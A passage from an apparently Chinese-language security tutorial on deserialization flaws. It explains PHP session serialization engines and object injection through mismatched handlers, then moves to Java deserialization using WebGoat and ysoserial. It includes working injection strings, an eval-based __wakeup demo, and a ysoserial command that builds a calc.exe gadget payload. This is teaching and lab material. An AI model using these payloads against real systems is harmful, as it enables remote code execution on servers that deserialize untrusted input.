<p>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，<strong>将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。</strong>当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p>
</blockquote>
<p><strong>php 中的 session 存储相关匹配值：</strong></p>
<p>PHP 版本 &gt;= 5.4 中有关 session 的相关配置：php.ini</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line"><span class="comment"># enabled = on 表示 upload_progress 功能开启，即当浏览器向服务器上传一个文件时，php 会把此次文件上传的详细信息，如上传时间、上传进度等都储存在 session中</span></span><br><span class="line"></span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line"><span class="comment"># cleanup = on 当文件上传结束之后， oho 会立即将对应的 session 文件清空</span></span><br><span class="line"></span><br><span class="line">3. session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line">4. session.upload_progress.name = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="comment"># name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</span></span><br><span class="line"><span class="comment"># 重点：prefix+name将表示为session中的键名</span></span><br><span class="line"></span><br><span class="line">5. session.upload_progress.freq = <span class="string">&quot;1%&quot;</span></span><br><span class="line">6. session.upload_progress.min_freq = <span class="string">&quot;1&quot;</span></span><br><span class="line">7. session.use_strict_mode=off </span><br><span class="line"><span class="comment"># 表示我们对 Cookie 中的 session 是可控的</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. session.save_path=<span class="string">&quot;&quot;</span>	</span><br><span class="line"><span class="comment"># 设置 session 的储存路径</span></span><br><span class="line"></span><br><span class="line">2. session.save_handler=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span></span><br><span class="line"></span><br><span class="line">3. session.auto_start</span><br><span class="line"><span class="comment"># boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span></span><br><span class="line"></span><br><span class="line">4. session.serialize_handler</span><br><span class="line"><span class="comment"># string --定义用来序列化/反序列化的处理器名字。默认使用php</span></span><br></pre></td></tr></table></figure>

<p>php 版本为 5.4.45 的部分默认配置如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;session.save_path = <span class="string">&quot;/tmp&quot;</span></span><br><span class="line">session.save_handler = files</span><br><span class="line">session.auto_start = 0</span><br><span class="line">session.serialize_handler = php</span><br></pre></td></tr></table></figure>

<p><code>session.serialize_handler = php</code> 该选项是用来设置 session 的 <code>序列化引擎</code> 的，除了默认的 php 引擎之外，也存在其他的，不同的 引擎对应的 session 的存储方式不同。</p>
<p><strong>其它存储引擎如下</strong>：</p>
<ul>
<li><strong>php_binary</strong>:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</li>
<li><strong>php</strong>:存储方式是，键名+竖线+经过serialize()函数序列处理的值</li>
<li><strong>php_serialize(php&gt;5.5.4)</strong>:存储方式是，经过serialize()函数序列化处理的值</li>
</ul>
<p>如果需要修改该引擎，须有手动添加代码 <code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;);</code>，例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"> session_start();</span><br></pre></td></tr></table></figure>

<p>下面我们仅仅讨论 php 引擎所引起的 反序列化。</p>
<p><strong>php 中的 session 存储机制：</strong></p>
<p>php 中的 session 中的内容不是存在内存当中的，而是以文件的形式进行存储，存储方式是由配置项 <code>session.save_handler</code> 来进行确定的，默认以文件的方式存储。所存储的文件名是以 <code>sess_sessionid</code> 来进行命名的，文件的内容就是 session 值得序列化之后的内容。</p>
<p><img src="https://i.loli.net/2021/09/12/VwE3NXjsbhq5KoJ.png" alt="image-20210912093352903"></p>
<p>例如：客户端的用户进行抓包，在 <code>Cookie</code> 字段中进行设置 <code>PHPSESSION=test</code> ，则 服务器上就将会创建一个文件 <code>/tmp/sess_test</code> 文件，用于存储 用户的 SESSIONS 信息。</p>
<p>测试：PHP 7.3.4             </p>
<p><strong>php 默认引擎下：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/12/TNsWVOG8L9oZwQ3.png" alt="image-20210912100023408"></p>
<p>session 文件中其中，<code>name</code> 是键名，<code>s:4:&quot;test&quot;;</code> 是 <code>serialize(&quot;test&quot;)</code> 的结果。</p>
<p><strong>php_serialize 引擎下：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"> session_start();</span><br><span class="line"> <span class="variable">$SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/12/ARNKoeV6fZXclxU.png" alt="image-20210912100614688"></p>
<p>session 文件内容是 a:1:{s:4:”name”;s:4:”test”;}，其中 </p>
<p><code>a:1</code> 只要是使用 php_serialize 引擎都会加上的，然后使用 php_serialize 引擎将会把 session 中的键名和键值都进行反序列化。</p>
<p><strong>在php_binary引擎下：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"> session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/12/CVnR1U5O6mioqtc.png" alt="image-20210912101016728"></p>
<p>session 文件内容是 names:4:”test”;</p>
<p>由于<code>name</code>的长度是4，4在ASCII表中对应的就是<code>EOT</code>。根据php_binary的存储规则，最后就是<code>names:6:&quot;spoock&quot;;</code>。(突然发现ASCII的值为4的字符无法在网页上面显示，这个大家自行去查ASCII表吧)</p>
<h3 id="3-6-2-php-session-序列化简单测试：利用原理"><a href="#3-6-2-php-session-序列化简单测试：利用原理" class="headerlink" title="3.6.2 php-session 序列化简单测试：利用原理"></a>3.6.2 php-session 序列化简单测试：利用原理</h3><p><strong>序列化简单测试：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">lover</span></span>&#123;</span><br><span class="line">    	<span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;func = <span class="string">&#x27;phpinfo()&#x27;</span>;    </span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们可以传入：<code>?a=O:5:&quot;lover&quot;:1:&#123;s:4:&quot;func&quot;;s:14:&quot;echo%20&quot;spoock&quot;;&quot;;&#125;</code></p>
<p>则将会在页面中输出 <code>spoock</code> 。</p>
<p><strong>php session 反序列化构造：</strong></p>
<p>PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。<br><strong>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确的进行反序列化。</strong>通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。</p>
<p>示例：</p>
<p>假如 题目本身是 php_serialize 的存储引擎，如果我们注入数据：<code>a=|o:4:&quot;test&quot;:0:&#123;&#125;</code></p>
<p>则 其通过 php_serialize 的引擎处理过后，将会变成 <code>a:1:&#123;s:1:&quot;a&quot;;a:16:&quot;|o:4:&quot;test&quot;:0:&#123;&#125;&quot;&#125;</code></p>
<p>随后 如果我们利用 php 的存储引擎来读取，那么经过解读之后将会理解为 ： <code>&#123;s:1:&quot;a&quot;;a:16:&quot;</code>  是键名，而 | 后面的就会被理解为一个对象的实例化注入。</p>
<p><strong>测试 ：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>访问 ?a=|o:4:”test”:0:{}</p>
<p>此时 session 文件内容为 a:1:{s:1:”a”;a:16:”|o:4:”test”:0:{}”}</p>
<p>设置 <code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code> ，即使用 php 引擎读取，再次访问即可。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [<span class="string">&quot;a:1:&#123;s:1:&quot;</span>a<span class="string">&quot;;a:16:&quot;</span><span class="string">&quot;]=&gt;</span></span><br><span class="line"><span class="string">  object(stdClass)#1 (0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-6-3-php-session-序列化实际利用"><a href="#3-6-3-php-session-序列化实际利用" class="headerlink" title="3.6.3 php-session 序列化实际利用"></a>3.6.3 php-session 序列化实际利用</h3><p><strong>必备知识：</strong></p>
<ul>
<li><ul>
<li><p>选项 <code>session.auto_start=On</code>  ，PHP在接收请求时会自动初始化 Session，不需要执行 session_start()。默认情况下，该选项 <code>关闭</code> 。</p>
</li>
<li><p>选项 <code>session.use_strict_mode=0</code> ，默认值是0即未启动时，用户可以自定义 session。</p>
<p>方法：用户自己抓包，在 Cookie 里面设置，PHPSESSION=flag，那么PHP将会在服务器上也创建一个文件 <code>/tmp/sess_flag</code>  。这时用户并没有初始化 session ，php也照样自动初始化 session，而产生了一个键值，该键值由 <code>ini.get(&quot;session.upload_progress.prefix&quot;)+我们构造的session.upload_progress.name</code> 一起组成，最终写入 <code>sess_文件</code> li里。</p>
<p>linux 下，session文件一般的默认存储位置是 <code>/tmp 或 /var/lib/php/session</code></p>
</li>
</ul>
</li>
<li><p>避免 <code>session.upload_progress.cleanup=on</code> 的干扰</p>
<p>该选项导致文件成功上传之后，一旦读取 POST 信息之后，会清除进度信息，session 文件将会被立即清理。重点是 该选项默认开启。</p>
<ul>
<li>方法：<strong>条件竞争</strong></li>
</ul>
</li>
</ul>
<p><strong>当 session.auto_start＝On 时：</strong></p>
<p>如果 session.auto_start＝On ，就会自动注册 session 会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，因此我们需要 <strong>在脚本中设置 序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话</strong>，然后再设置需要的序列化处理器，那么第一次我们所使用的就是我们自己设置的存储器，而第二次执行时，系统仍会自动调用 session_start() 函数注册会话，这时所使用的就是默认的存储引擎了。</p>
<p>所以，如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题，如下面的代码：</p>
<p>已知：默认的存储引擎是 php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (ini_get(<span class="string">&#x27;session.auto_start&#x27;</span>)) &#123;</span><br><span class="line">    session_destroy();</span><br><span class="line">&#125;</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>第一次访问脚本 ，传入参数 <code>?a=|O:8:&quot;stdClass&quot;:0:&#123;&#125;</code>，脚本将会按照 php_serialize 处理数据，得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:1:&quot;a&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>第二次访问，PHP 会按照 php.ini 里设置的序列化处理器反序列化存储的数据，这时如果 php.ini 里设置的是 php 处理器的话，将会反序列化伪造的数据，成功实例化了 stdClass 对象：）。</p>
<p><strong>当 session.auto_start＝Off 时：</strong></p>
<p>两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题，如下面的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//foo1.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//foo2.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">//or session.serialize_handler set to php in php.ini </span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$hi</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;hi;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问 foo1.php 提交数据 ?a=|O:1:”a”:1:{s:2:”hi”;s:7:”success”;}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:1:&quot;a&quot;;s:36:&quot;|O:1:&quot;a&quot;:1:&#123;s:2:&quot;hi&quot;;s:7:&quot;success&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>再访问 foo2.php ，成功</p>
<p><img src="https://i.loli.net/2021/09/12/9BrpshRMXJCjGUz.png" alt="image-20210912112309204"></p>
<p>由于 访问 foo1 时，传入的数据将会使用 php_serialize 进行序列化，然后再访问 foo2 时，程序将会使用 php 引擎来反序列化 session 中是之举，从而实例化 a 对象，而执行其中的魔术方法。</p>
<p><strong>补充：</strong></p>
<p>为什么在 解析 session 文件时为什么在解析session文件时直接对’|’后的值进行反序列化处理，这也是处理器的功能？这个其实是因为session_start()这个函数，可以看下官方说明：</p>
<blockquote>
<p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 session_set_save_handler() 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量</p>
</blockquote>
<h3 id="3-6-4-CTF-题目"><a href="#3-6-4-CTF-题目" class="headerlink" title="3.6.4 CTF 题目"></a>3.6.4 CTF 题目</h3><h1 id="速查"><a href="#速查" class="headerlink" title="速查"></a>速查</h1><ul>
<li><p>序列化后的结果是一串字符串。</p>
</li>
<li><p>反序列化会解开序列化的字符串生成相应类型的数据。</p>
</li>
</ul>
<p>如下代码示例，img是一个数组，下标分别是one和two，对应的值分别是flag,test。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$img[&#x27;one&#x27;] = &quot;flag&quot;;</span><br><span class="line">$img[&#x27;two&#x27;] = &quot;test&quot;;</span><br><span class="line">$a = serialize($img);</span><br><span class="line">var_dump($a);</span><br><span class="line">#输出: string(48) &quot;a:2:&#123;s:3:&quot;one&quot;;s:4:&quot;flag&quot;;s:3:&quot;two&quot;;s:4:&quot;test&quot;;&#125;&quot;</span><br><span class="line"></span><br><span class="line">$b = unserialize($a);</span><br><span class="line">var_dump($b);</span><br><span class="line">/*输出如下内容:</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [&quot;one&quot;]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [&quot;two&quot;]=&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<p><strong>序列化部分</strong>:</p>
<p>经过serialize序列化后生成了相应的字符串: a:2:{s:3:”one”;s:4:”flag”;s:3:”two”;s:4:”test”;}</p>
<p>a表示数组 , a:2中的2表示有两个键值，即对应的one、two两组键值对。</p>
<p>花括号中的s都表示string即字符串，</p>
<p>s:后面的值分别是3、4、3、4,即对应的字符串长度，比如one长度是三，flag长度是4</p>
<p><strong>反序列化部分:</strong></p>
<p>unserialize函数将字符串解序列化，我们用var_dump函数显示了他的详细信息。</p>
<p>可见解序列化后由变量$b，接收了img数组。</p>
<h3 id="序列化中每个字母的表示"><a href="#序列化中每个字母的表示" class="headerlink" title="序列化中每个字母的表示"></a>序列化中每个字母的表示</h3><table>
<thead>
<tr>
<th align="left">a</th>
<th align="left">array数组</th>
</tr>
</thead>
<tbody><tr>
<td align="left">b</td>
<td align="left">boolean判断类型</td>
</tr>
<tr>
<td align="left">d</td>
<td align="left">double浮点数</td>
</tr>
<tr>
<td align="left">i</td>
<td align="left">integer整数型</td>
</tr>
<tr>
<td align="left">o</td>
<td align="left">common object 一般的对象</td>
</tr>
<tr>
<td align="left">r</td>
<td align="left">reference引用类型</td>
</tr>
<tr>
<td align="left">s</td>
<td align="left">string字符串类型</td>
</tr>
<tr>
<td align="left">C</td>
<td align="left">custom object</td>
</tr>
<tr>
<td align="left">O</td>
<td align="left">class</td>
</tr>
<tr>
<td align="left">N</td>
<td align="left">null</td>
</tr>
<tr>
<td align="left">R</td>
<td align="left">pointer reference</td>
</tr>
<tr>
<td align="left">U</td>
<td align="left">unicode string</td>
</tr>
</tbody></table>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //使用unserialize时触发 </span><br><span class="line">__sleep() 	//使用serialize时触发 </span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call()    //在对象上下文中调用不可访问的方法时触发——对象调用一个没有声明的方法时，触发 </span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发 </span><br><span class="line">__get() //用于从不可访问的属性读取数据 </span><br><span class="line">__set() //用于将数据写入不可访问的属性 </span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发 </span><br><span class="line">__unset() //在不可访问的属性上使用<span class="built_in">unset</span>()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发 <span class="built_in">echo</span> 对象; <span class="variable">$text</span>=<span class="variable">$test</span>+$对象； </span><br><span class="line">__invoke() //当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</span><br></pre></td></tr></table></figure>



<h2 id="1-3-危害"><a href="#1-3-危害" class="headerlink" title="1.3 危害"></a>1.3 危害</h2><p>SQL注入</p>
<p>代码执行</p>
<p>目录遍历</p>
<h1 id="四、JAVA-反序列化"><a href="#四、JAVA-反序列化" class="headerlink" title="四、JAVA 反序列化"></a>四、JAVA 反序列化</h1><p>序列化：将对象的状态信息转换为可以存储或者传输的形式的过程。序列化期间，对象将其当前的状态写入到临时或持久型储存区。</p>
<p>反序列化：从储存区读取到数据，将其还原为对象</p>
<p><strong>好处：</strong></p>
<ul>
<li>把对象的字节序列永久地保存到硬盘上，实现对象的持久化，通常存放在一个文件中；</li>
<li>利用序列化实现远程通信，即在网络上传递对象的字节序列。</li>
</ul>
<p><strong>实例理解</strong></p>
<blockquote>
<p>Web 服务器中的 Session 会话对象，当有10万用户并发访问，就有可能出现10万个 Session 对象，显然这种情况内存可能是吃不消的。</p>
<p>于是 Web 容器就会把一些 Session 先序列化，让他们离开内存空间，序列化到硬盘中，当需要调用时，再把保存在硬盘中的对象还原到内存中。</p>
<hr>
<p>我们知道，当两个进程进行远程通信时，彼此可以发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。</p>
<p>同样的序列化与反序列化则实现了 <strong>进程通信间的对象传送</strong>，发送方需要把这个Java对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为Java对象。</p>
</blockquote>
<p><strong>JDK 类库中序列化 API</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//序列化:对参数指定的obj对象进行序列化，将字节序列写入到一个目标输出流中</span></span><br><span class="line">ObjectOutputStream类 writeObject()</span><br><span class="line"><span class="comment">//反序列化:从一个源输入流中读取字节序列，把他们反序列化为一个对象，将其返回</span></span><br><span class="line">ObjectIntputStream类 readObject()</span><br></pre></td></tr></table></figure>

<p><strong>工具</strong>    <a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/releases">https://github.com/frohoff/ysoserial/releases</a></p>
<p><strong>WebGoat</strong>    <a target="_blank" rel="noopener" href="https://github.com/WebGoat/WebGoat/releases">https://github.com/WebGoat/WebGoat/releases</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull webgoat/webgoat-8.0</span><br><span class="line">docker images</span><br><span class="line">docker run -p 8080:8080 -t webgoat/webgoat-8.0</span><br><span class="line">http://192.168.158.111:8080/WebGoat/login</span><br></pre></td></tr></table></figure>

<h2 id="4-1-WebGoat"><a href="#4-1-WebGoat" class="headerlink" title="4.1 WebGoat"></a>4.1 WebGoat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l</span><br><span class="line">即序列化+base64加密</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/15/bMn8ex1dK7QRVPD.png" alt="image-20210504171938337"></p>
<p><strong>命令执行 + 反弹 shell(以免不会回显)</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#思路:以 执行 ipconfig 命令为例</span></span><br><span class="line">ipconfig --&gt; 序列化 --&gt; base64加密 --&gt; 最终转换成以rO0AB格式开头的字符串作为我们的payload</span><br></pre></td></tr></table></figure>

<p><strong>工具形成 payload</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Dhibernate5 -cp hibernate-core-5.4.9.Final.jar;ysoserial-master-30099844c6-1.jar ysoserial.GeneratePayload Hibernatel calc.exe &gt; payload.bin</span><br></pre></td></tr></table></figure>

<p>再将生成的 payload.bin 进行一个base64加密：使用python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">c = <span class="built_in">open</span>(<span class="string">&quot;payload.bin路径&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">cc = base64.urlsafe_b64encode(c)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;wt&quot;</span>,ecoding=<span class="string">&quot;utf-8&quot;</span>).write(cc.decode())</span><br></pre></td></tr></table></figure>

